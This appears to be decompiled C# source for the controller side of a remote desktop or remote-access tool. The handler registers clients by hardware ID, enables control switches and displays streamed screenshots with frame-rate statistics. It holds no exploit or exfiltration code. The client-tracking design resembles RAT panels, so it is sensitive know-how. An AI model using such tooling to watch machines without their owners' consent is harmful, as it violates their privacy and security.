using Server.Connectings;
using Server.Forms;
using Server.Helper;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;

#nullable disable
namespace Server.Messages
{
    internal class HandlerDesktop
    {
        public static void Read(Clients client, object[] objects)
        {
            switch ((string)objects[1])
            {
                case "Connect":
                    FormDesktop form1 = (FormDesktop)Application.OpenForms["Desktop:" + (string)objects[2]];
                    if (form1 == null)
                    {
                        client.Disconnect();
                        break;
                    }
                    form1.Invoke(new MethodInvoker(() =>
                    {
                        form1.client = client;
                        form1.screen = new Size((int)objects[3], (int)objects[4]);
                        form1.Text = "Desktop [" + (string)objects[2] + "]";
                        form1.materialSwitch1.Enabled = true;
                        form1.materialSwitch2.Enabled = true;
                        form1.materialSwitch3.Enabled = true;
                        form1.materialSwitch4.Enabled = true;
                        form1.numericUpDown2.Enabled = true;
                    }));
                    client.Tag = (object)form1;
                    client.Hwid = (string)objects[2];
                    break;
                case "Screen":
                    FormDesktop form2 = (FormDesktop)client.Tag;
                    if (form2 == null)
                    {
                        client.Disconnect();
                        break;
                    }
                    Bitmap bitmap = Methods.ByteArrayToBitmap((byte[])objects[2]);
                    ++form2.FPS;
                    if (form2.sw.ElapsedMilliseconds >= 1000L)
                    {
                        form2.Text = string.Format("Desktop [{0}]  Fps[{1}] Data[{2}] Size[{3}x{4}] Screen[{5}x{6}]", (object)client.Hwid, (object)form2.FPS, (object)Methods.BytesToString((long)((byte[])objects[2]).Length), (object)bitmap.Width, (object)bitmap.Height, (object)form2.screen.Width, (object)form2.screen.Height);
                        form2.FPS = 0;
                        form2.sw = Stopwatch.StartNew();
                    }
                    form2.pictureBox1.Invoke(new MethodInvoker(() => form2.pictureBox1.Image = (Image)bitmap));
                    break;
            }
        }
    }
}
